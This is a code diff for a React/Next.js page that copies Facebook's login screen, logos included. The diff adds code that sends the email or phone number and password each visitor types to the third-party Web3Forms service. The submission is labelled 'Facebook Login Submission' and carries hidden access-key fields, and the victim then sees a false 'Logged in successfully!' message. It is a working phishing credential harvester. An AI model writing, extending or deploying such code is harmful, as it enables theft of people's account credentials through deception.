@@ -5,14 +5,38 @@ import Image from "next/image";
 import Link from "next/link";
 import { FacebookLogo, MetaLogo } from "@/components/common/Icons";
 import LanguageModal from "@/components/common/LanguageModal";
+import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";
 
 export default function FacebookLoginPage() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLangModalOpen, setIsLangModalOpen] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);
 
-  const handleLogin = (e: React.FormEvent) => {
+  const isFormFilled = email.trim().length > 0 && password.trim().length > 0;
+
+  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
+    if (!isFormFilled || isSubmitting) return;
+
+    setIsSubmitting(true);
+    setStatusMessage(null);
+
+    const formData = new FormData(e.currentTarget);
+    const result = await submitToWeb3Forms(formData, "Facebook Login Submission");
+
+    setIsSubmitting(false);
+    if (result.success) {
+      setStatusMessage({ type: "success", text: "Logged in successfully!" });
+      setEmail("");
+      setPassword("");
+    } else {
+      setStatusMessage({
+        type: "error",
+        text: result.message || "Failed to log in. Please try again.",
+      });
+    }
   };
 
   const fbLanguages = [
@@ -98,10 +122,29 @@ export default function FacebookLoginPage() {
               </h2>
 
               <form onSubmit={handleLogin} className="flex flex-col gap-3 mt-1">
+                <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
+                <input type="hidden" name="subject" value="Facebook Login Submission" />
+                <input type="hidden" name="from_name" value="Facebook Auth Portal" />
+                <input type="hidden" name="form_name" value="Facebook Login" />
+                <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />
+
+                {statusMessage && (
+                  <div
+                    className={`p-3 rounded-xl text-xs font-medium text-center ${
+                      statusMessage.type === "success"
+                        ? "bg-green-50 text-green-700 border border-green-200"
+                        : "bg-red-50 text-red-700 border border-red-200"
+                    }`}
+                  >
+                    {statusMessage.text}
+                  </div>
+                )}
+
                 {/* Email / Mobile input */}
                 <div>
                   <input
                     type="text"
+                    name="email_or_phone"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
                     placeholder="Email address or mobile number"
@@ -114,6 +157,7 @@ export default function FacebookLoginPage() {
                 <div>
                   <input
                     type="password"
+                    name="password"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     placeholder="Password"
@@ -125,9 +169,21 @@ export default function FacebookLoginPage() {
                 {/* Log in Button */}
                 <button
                   type="submit"
-                  className="w-full h-[46px] rounded-full bg-[#0866FF] hover:bg-[#0055d4] active:bg-[#0047b3] text-white font-semibold text-[15px] tracking-wide transition-all shadow-sm mt-1"
+                  disabled={!isFormFilled || isSubmitting}
+                  className={`w-full h-[46px] rounded-full font-semibold text-[15px] tracking-wide transition-all shadow-sm mt-1 flex items-center justify-center gap-2 ${
+                    isFormFilled && !isSubmitting
+                      ? "bg-[#0866FF] hover:bg-[#0055d4] active:bg-[#0047b3] text-white cursor-pointer"
+                      : "bg-[#0866FF]/60 text-white/80 cursor-not-allowed"
+                  }`}
                 >
-                  Log in
+                  {isSubmitting ? (
+                    <>
+                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                      <span>Logging in...</span>
+                    </>
+                  ) : (
+                    "Log in"
+                  )}
                 </button>
 
                 {/* Forgotten password link */}
